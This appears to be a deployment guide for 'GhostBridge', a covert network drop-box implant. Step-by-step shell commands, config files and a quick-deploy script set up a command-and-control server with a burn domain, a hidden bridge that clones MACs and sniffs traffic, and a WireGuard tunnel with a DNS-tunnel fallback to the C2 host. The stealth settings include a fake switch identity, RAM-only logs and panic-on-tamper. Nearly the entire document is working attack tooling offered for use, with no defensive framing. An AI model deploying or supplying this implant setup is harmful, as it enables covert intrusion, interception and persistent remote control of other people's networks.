# 🚀 GhostBridge Deployment Guide

> **Version:** 0.6.0 | **Last Updated:** 2025-12-22

---

## 📋 Prerequisites

### Hardware Required

| Item | Specification | Purpose |
|------|---------------|---------|
| NanoPi R2S Plus | 1GB RAM, 32GB eMMC | Main device |
| MicroSD Card | 32GB+ Class 10 | OS installation |
| Ethernet Cable | Cat5e, 15-30cm | LAN connection |
| USB-C Cable | 1m, data+power | Power supply |
| USB Card Reader | MicroSD compatible | Flashing |

### Software Required

| Software | Version | Purpose |
|----------|---------|---------|
| Armbian | Latest | Base OS |
| Python | 3.11+ | GhostBridge |
| WireGuard | Latest | VPN tunnel |
| balenaEtcher | Latest | Image flashing |

### C2 Infrastructure

| Component | Requirement |
|-----------|-------------|
| VPS | 1 vCPU, 1GB RAM, Ubuntu 22.04 |
| Domain | Burn domain for C2 |
| DNS Tunnel Domain | Subdomain for fallback (v0.6.0) |
| MoMo Server | Running instance (optional) |

---

## 🛠️ Step-by-Step Deployment

### Step 1: Prepare C2 Server

```bash
# On your VPS (Ubuntu 22.04)

# Update system
sudo apt update && sudo apt upgrade -y

# Install WireGuard
sudo apt install wireguard -y

# Generate server keys
wg genkey | tee /etc/wireguard/server_private.key | wg pubkey > /etc/wireguard/server_public.key
chmod 600 /etc/wireguard/server_private.key

# Configure WireGuard server
cat > /etc/wireguard/wg0.conf << EOF
[Interface]
Address = 10.66.66.1/24
ListenPort = 51820
PrivateKey = $(cat /etc/wireguard/server_private.key)
PostUp = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
PostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE

# GhostBridge devices will be added here
EOF

# Enable IP forwarding
echo "net.ipv4.ip_forward = 1" >> /etc/sysctl.conf
sysctl -p

# Start WireGuard
systemctl enable wg-quick@wg0
systemctl start wg-quick@wg0

# Verify
wg show
```

### Step 2: Flash Base Image

```bash
# Download Armbian for NanoPi R2S
wget https://redirect.armbian.com/nanopi-r2s/Bookworm_current

# Flash to MicroSD using balenaEtcher or dd
sudo dd if=Armbian_*.img of=/dev/sdX bs=4M status=progress
sync
```

### Step 3: Initial Configuration

```bash
# Connect via SSH (default: root / 1234)

# Change root password
passwd

# Set hostname (use generic name)
hostnamectl set-hostname netswitch

# Update system
apt update && apt upgrade -y

# Install dependencies
apt install -y \
    python3 python3-pip python3-venv \
    wireguard wireguard-tools \
    bridge-utils iproute2 \
    net-tools htop tmux git curl wget

# Disable unnecessary services
systemctl disable --now bluetooth cups avahi-daemon ModemManager

# Set timezone
timedatectl set-timezone UTC
```

### Step 4: Install GhostBridge

```bash
# Create directory
mkdir -p /opt/ghostbridge
cd /opt/ghostbridge

# Clone repository
git clone https://github.com/Momo-Master/Momo-GhostBridge.git .

# Create virtual environment
python3 -m venv venv
source venv/bin/activate

# Install dependencies
pip install -r requirements.txt
pip install -e .

# Create config directory
mkdir -p /etc/ghostbridge
```

### Step 5: Generate Device Keys

```bash
# Generate WireGuard keys
wg genkey | tee /etc/ghostbridge/wg_private.key | wg pubkey > /etc/ghostbridge/wg_public.key
chmod 600 /etc/ghostbridge/wg_private.key

# Generate device identity
DEVICE_ID="ghost-$(date +%s | tail -c 5)"
echo $DEVICE_ID > /etc/ghostbridge/device_id

# Display keys (add public key to C2 server)
echo "Device ID: $DEVICE_ID"
echo "Public Key: $(cat /etc/ghostbridge/wg_public.key)"
```

### Step 6: Configure WireGuard

```bash
# Create WireGuard config
cat > /etc/wireguard/wg0.conf << EOF
[Interface]
PrivateKey = $(cat /etc/ghostbridge/wg_private.key)
Address = 10.66.66.2/24

[Peer]
PublicKey = <C2_SERVER_PUBLIC_KEY>
Endpoint = your-c2-server.com:51820
AllowedIPs = 10.66.66.0/24
PersistentKeepalive = 25
EOF

chmod 600 /etc/wireguard/wg0.conf
```

### Step 7: Configure GhostBridge

```yaml
# /etc/ghostbridge/config.yml
device:
  id: "ghost-001"
  name: "Office Printer Drop"
  
network:
  bridge_name: br0
  wan_interface: eth0
  lan_interface: eth1
  clone_mac: true
  
tunnel:
  type: wireguard
  interface: wg0
  endpoint: "your-c2-server.com:51820"
  keepalive: 25
  reconnect_delays: [5, 10, 30, 60, 300]
  
  # DNS Tunnel Fallback (v0.6.0)
  dns_tunnel:
    enabled: true
    domain: "tunnel.your-c2-server.com"
    nameservers: ["8.8.8.8", "1.1.1.1"]
    encoder: base32
    chunk_size: 63
    query_interval: 0.5
  
beacon:
  enabled: true
  interval: 300
  jitter: 60
  
c2:
  api_endpoint: "http://10.66.66.1:8082/api/ghostbridge"
  
stealth:
  ramfs_logs: true
  fake_identity: "Netgear GS105"
  panic_on_tamper: true
  
logging:
  level: WARNING
  to_disk: false
```

### Step 8: Setup Bridge Script

```bash
# Create /etc/ghostbridge/setup-bridge.sh
cat > /etc/ghostbridge/setup-bridge.sh << 'EOF'
#!/bin/bash
BRIDGE=br0
WAN=eth0
LAN=eth1

# Wait for interfaces
while [ ! -e /sys/class/net/$LAN ]; do sleep 1; done

# Create bridge
ip link add name $BRIDGE type bridge
ip link set $BRIDGE up
echo 0 > /sys/class/net/$BRIDGE/bridge/stp_state

# Add interfaces
ip link set $WAN master $BRIDGE
ip link set $LAN master $BRIDGE

# Enable promiscuous mode
ip link set $WAN promisc on
ip link set $LAN promisc on

# Bring up interfaces
ip link set $WAN up
ip link set $LAN up

echo "Bridge $BRIDGE configured"
EOF

chmod +x /etc/ghostbridge/setup-bridge.sh
```

### Step 9: Create Systemd Services

```bash
# Main service
cat > /etc/systemd/system/ghostbridge.service << EOF
[Unit]
Description=GhostBridge Main Service
After=network-online.target
Wants=network-online.target

[Service]
Type=oneshot
ExecStart=/etc/ghostbridge/setup-bridge.sh
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF

# Tunnel service
cat > /etc/systemd/system/ghostbridge-tunnel.service << EOF
[Unit]
Description=GhostBridge Tunnel Service
After=ghostbridge.service
Requires=ghostbridge.service

[Service]
Type=simple
ExecStart=/usr/bin/wg-quick up wg0
ExecStop=/usr/bin/wg-quick down wg0
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
EOF

# Enable services
systemctl daemon-reload
systemctl enable ghostbridge ghostbridge-tunnel
```

### Step 10: Test & Verify

```bash
# Test bridge
systemctl start ghostbridge
ip link show br0
brctl show br0

# Test tunnel
systemctl start ghostbridge-tunnel
wg show
ping -c 3 10.66.66.1

# Reboot test
reboot
```

---

## ✅ Deployment Verification

### Pre-Deployment Checklist

| Check | Status |
|-------|--------|
| Device boots without monitor/keyboard | □ |
| Bridge passes traffic | □ |
| Tunnel connects to C2 | □ |
| DNS fallback works (v0.6.0) | □ |
| Beacon reaches MoMo | □ |
| Panic script tested | □ |
| No unnecessary logs | □ |
| All services auto-start | □ |

### Connection Test

```bash
# On C2 server - verify device appears
wg show

# Check MoMo dashboard
# Device should appear in GhostBridge fleet

# Send test command
curl -X POST http://localhost:8082/api/ghostbridge/command \
  -H "Content-Type: application/json" \
  -d '{"device_id": "ghost-001", "action": "status"}'
```

---

## 🔧 Troubleshooting

### Device Won't Boot

| Symptom | Cause | Solution |
|---------|-------|----------|
| No LED | No power | Check USB-C cable |
| LED on, no network | SD card issue | Re-flash image |
| Kernel panic | Corrupt image | Re-flash image |

### Bridge Not Working

| Symptom | Cause | Solution |
|---------|-------|----------|
| No traffic | Bridge not up | `brctl show br0` |
| Target offline | Wrong cable | Check eth0/eth1 |
| Partial traffic | STP enabled | Disable STP |

### Tunnel Not Connecting

| Symptom | Cause | Solution |
|---------|-------|----------|
| No handshake | Firewall | Check port 51820 |
| Timeout | Wrong endpoint | Verify C2 IP/domain |
| Key error | Key mismatch | Regenerate keys |

### DNS Tunnel Issues (v0.6.0)

| Symptom | Cause | Solution |
|---------|-------|----------|
| No fallback | DNS blocked | Try different nameservers |
| Slow transfer | High latency | Increase query interval |
| Decode errors | Wrong encoder | Match encoder on both ends |

---

## 📦 Quick Deploy Script

```bash
#!/bin/bash
# Usage: ./deploy.sh <C2_ENDPOINT> <C2_PUBKEY> [DNS_DOMAIN]

C2_ENDPOINT=$1
C2_PUBKEY=$2
DNS_DOMAIN=${3:-""}
DEVICE_ID="ghost-$(date +%s | tail -c 5)"

if [ -z "$C2_ENDPOINT" ] || [ -z "$C2_PUBKEY" ]; then
    echo "Usage: $0 <c2_endpoint> <c2_pubkey> [dns_domain]"
    exit 1
fi

echo "Deploying GhostBridge..."
echo "Device ID: $DEVICE_ID"
echo "C2 Endpoint: $C2_ENDPOINT"
[ -n "$DNS_DOMAIN" ] && echo "DNS Fallback: $DNS_DOMAIN"

# Generate keys
wg genkey | tee /etc/ghostbridge/wg_private.key | wg pubkey > /etc/ghostbridge/wg_public.key
echo $DEVICE_ID > /etc/ghostbridge/device_id

# Configure WireGuard
cat > /etc/wireguard/wg0.conf << EOF
[Interface]
PrivateKey = $(cat /etc/ghostbridge/wg_private.key)
Address = 10.66.66.2/24

[Peer]
PublicKey = $C2_PUBKEY
Endpoint = $C2_ENDPOINT
AllowedIPs = 10.66.66.0/24
PersistentKeepalive = 25
EOF

# Start services
systemctl enable --now ghostbridge ghostbridge-tunnel

# Display registration info
echo ""
echo "=== REGISTER ON C2 SERVER ==="
echo "Device ID: $DEVICE_ID"
echo "Public Key: $(cat /etc/ghostbridge/wg_public.key)"
echo ""
echo "Add this peer to C2 WireGuard config:"
echo "[Peer]"
echo "# $DEVICE_ID"
echo "PublicKey = $(cat /etc/ghostbridge/wg_public.key)"
echo "AllowedIPs = 10.66.66.2/32"
echo ""
echo "Deployment complete!"
```

---

*GhostBridge Deployment Guide v0.6.0*
